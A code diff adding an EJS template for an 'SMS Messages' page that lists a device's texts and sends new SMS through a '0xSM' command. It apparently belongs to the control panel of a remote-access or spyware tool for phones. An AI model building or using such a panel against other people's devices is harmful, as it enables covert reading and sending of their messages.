@@ -1,0 +1,59 @@
+<div class="card">
+    <div class="card-header">
+        <h2>SMS Messages</h2>
+        <button class="btn" onclick="sendCmd('0xSM', {action: 'ls'})">Refresh</button>
+    </div>
+    
+    <% if (!data.list || data.list.length === 0) { %>
+    <p class="empty">No SMS messages. Click Refresh to load.</p>
+    <% } else { %>
+    <div class="table-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>From/To</th>
+                    <th>Message</th>
+                    <th>Date</th>
+                    <th>Type</th>
+                </tr>
+            </thead>
+            <tbody>
+                <% data.list.forEach(sms => { %>
+                <tr>
+                    <td><code><%= sms.address %></code></td>
+                    <td class="wrap"><%= sms.body %></td>
+                    <td><%= new Date(parseInt(sms.date)).toLocaleString() %></td>
+                    <td><span class="badge <%= sms.type == 1 ? 'info' : 'success' %>"><%= sms.type == 1 ? 'Inbox' : 'Sent' %></span></td>
+                </tr>
+                <% }) %>
+            </tbody>
+        </table>
+    </div>
+    <% } %>
+</div>
+
+<div class="card">
+    <h2>Send SMS</h2>
+    <form onsubmit="sendSms(event)">
+        <div class="form-row">
+            <input type="tel" id="sms-to" placeholder="Phone number" required>
+            <input type="text" id="sms-msg" placeholder="Message" required>
+            <button type="submit" class="btn primary">Send</button>
+        </div>
+    </form>
+</div>
+
+<script>
+function sendSms(e) {
+    e.preventDefault();
+    const toField = document.getElementById('sms-to');
+    const msgField = document.getElementById('sms-msg');
+    sendCmd('0xSM', {
+        action: 'sendSMS',
+        to: toField.value,
+        sms: msgField.value
+    });
+    toField.value = '';
+    msgField.value = '';
+}
+</script>
